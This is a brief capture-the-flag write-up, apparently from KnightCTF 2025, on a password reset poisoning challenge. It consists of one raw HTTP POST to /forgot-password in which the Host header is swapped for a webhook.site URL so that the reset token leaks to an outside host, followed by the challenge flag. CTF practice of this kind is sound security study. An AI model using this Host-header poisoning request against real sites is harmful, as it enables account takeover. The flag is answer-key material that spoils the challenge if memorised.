Password reset poisoning

Request:
```
POST /forgot-password HTTP/1.1
Host: webhook.site/a4c1a058-93e6-425b-aaa2-c0fe92042a43
Content-Length: 30
Cache-Control: max-age=0
Accept-Language: en-US,en;q=0.9
Origin: http://45.56.68.122:7474
Content-Type: application/x-www-form-urlencoded
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.6778.86 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://45.56.68.122:7474/forgot-password
Accept-Encoding: gzip, deflate, br
Connection: keep-alive

email=kctf2025%40knightctf.com
```

Flag: `KCTF{PaSsW0rD_ReSet_p0isOn1ng_iS_FuN}`